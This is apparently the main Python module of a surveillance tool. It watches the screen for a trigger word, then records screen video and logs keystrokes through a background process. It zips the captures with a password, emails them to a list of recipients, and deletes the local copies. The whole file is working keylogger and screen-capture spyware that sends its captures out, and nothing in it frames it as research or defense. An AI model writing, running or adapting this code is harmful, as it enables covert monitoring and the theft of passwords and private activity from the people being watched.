#imports of packages and other .py files
import ctypes
import pyzipper
import cv2
import os
import sys
from PIL import ImageGrab
import numpy as np
import time
import shutil
import keyboard
import multiprocessing
from datetime import datetime
import logging

import TextReader
import Sender
import Encoder

class Client:
    def __init__(self, MailAdress, Name):
        self.MailAdress = MailAdress
        self.Name = Name

backslash = r'\n'[0]
Filepath = os.path.dirname(sys.argv[0])
Recordingspath = os.path.join(Filepath, "Recordings")


def main():

    Clientlist = []
    print(os.getcwd())
    logging.info(f"working file is {os.getcwd()}")
    with open("Clients.txt", 'r') as file:
        for line in file:
            line = line.strip()  # Remove leading/trailing whitespaces
            if line:
                name, email = line.split(',')
                client = Client(email.strip(), name.strip())
                Clientlist.append(client)
    print("Set clientlist")
    logging.info("Set clientlist")


    while True:
        Image = ImageGrab.grab()
        Frame = np.array(Image)
        if TextReader.ReadImage(Frame):
            logging.info("Found word")
            print("Found word")
            RSAword = Record()

            #when cache is "filled" to a certain number, sends all the records in the folder and the keyboard logs in mail to all clients
            fillednum = 1
            if len(os.listdir(Recordingspath)) >= fillednum:
                time.sleep(10)
                for Cl in Clientlist:
                    Sender.SendMail(Cl, Filepath, RSAword)
                time.sleep(10)

                #deletes all videos and text
                for name in os.listdir(Recordingspath):
                    os.remove(os.path.join(Recordingspath, name))
                os.remove(os.path.join(Filepath, "SendMe.zip"))
                logging.info("deleted files")
                print("deleted files")

                #creates a new Keyboards Log
                open(os.path.join(Filepath, "Keyboard Logs.txt"), "x")

def Record():

    max = 0
    for name in os.listdir(Recordingspath):
        number = int(name[6:-4])
        if number > max:
            max = number

    now = str(datetime.now())
    dotindex = now.index(".")
    now = now[0:dotindex]
    print(now)

    Fps = 12 # frames per second
    SCREEN_SIZE = (1920, 1080)
    VideoName = "Record" + str(max + 1) + ".mp4"
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    Video = cv2.VideoWriter(VideoName, fourcc, Fps, SCREEN_SIZE)
    VideoLength = 20
    LastFrameTime = 0

    logging.info("Set variables")
    print("Set variables")
    with open("Keyboard Logs.txt", 'a') as file:
        file.write(now + ", " + VideoName + " - ")
        file.close()
        pass

    logging.info("Set up date in Keyboard log")
    print("Set up date in Keyboard log")

    #setup manager and string values
    manager = multiprocessing.Manager()
    log = manager.Value(ctypes.c_wchar_p, "")



    #set process of keyboard recording
    ReadKeyProcess = multiprocessing.Process(target=ReadKey, args=(VideoLength, log, ))

    RecordStarTime = time.time()

    logging.info("Set up multiprocess Process and manager")
    print("Set up multiprocess Process and manager")

    logging.info("Starting both processes")
    print("Starting both processes")

    ReadKeyProcess.start()
    while time.time() - RecordStarTime < VideoLength:
        TimeNow = time.time()
        TimeElapsed = TimeNow - LastFrameTime

        if TimeElapsed > 1.0/Fps:
            LastFrameTime = TimeNow
            Image = ImageGrab.grab()
            Frame = np.array(Image)
            Frame = cv2.cvtColor(Frame, cv2.COLOR_BGR2RGB)
            Video.write(Frame)


    print("done")
    logging.info("done recroding")
    Video.release()

    shutil.move(os.path.join(Filepath , VideoName), Recordingspath)
    ReadKeyProcess.terminate()
    with open("Keyboard Logs.txt", 'a') as file:
        file.write(log.value)
        file.write("\n")
        file.close()

    shutil.move(os.path.join(Filepath, "Keyboard Logs.txt"), Recordingspath)

    ZipName = os.path.join(Filepath , "SendMe.zip")
    RSAword = Encoder.GetPassword()
    Password = RSAword.word
    CreateZip(Recordingspath, ZipName, Password)

    logging.info("Created Zip and Removed files")

    return RSAword


def ReadKey(VideoLength, log):
    chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
             'v', 'w', 'x', 'y', 'z',
             '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '`', '~', '\\', '/', '|', '.', '<',
             '>', '?', ',', ':', ';', "'", '"',
             'shift', 'alt', 'caps lock', 'tab', 'enter', 'backspace', 'space',
             '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    cache = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
             0, 0, 0, 0, 0, 0, 0, 0, 0,
             0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
             0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    breaktime = 0.25
    TimeStarted = time.time()
    while time.time() - TimeStarted < VideoLength:
        keypressed = keyboard.read_key()
        if keypressed.lower() in chars:
            if time.time() - cache[chars.index(keypressed.lower())] > breaktime:
                cache[chars.index(keypressed.lower())] = time.time()
                if len(keypressed) > 1:
                    if keypressed == 'space':
                        log.value += " "
                    else:
                        log.value += ", "
                        log.value += keypressed
                        log.value += " "

                else:
                    log.value += keypressed
                print(keypressed)
                logging.info(f"pressed: {keypressed}")

    pass

def CreateZip(directory_name, zip_name, password):
    try:
        with pyzipper.AESZipFile(zip_name, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(password.encode())
            for root, _, files in os.walk(directory_name):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, directory_name))
        logging.info(f'Directory "{directory_name}" compressed and locked successfully as "{zip_name}" with password {password}')
        print(f'Directory "{directory_name}" compressed and locked successfully as "{zip_name}"')
    except Exception as e:
        logging.info(f'An error occurred: {e}')
        print(f'An error occurred: {e}')


if __name__ == '__main__':
    main()
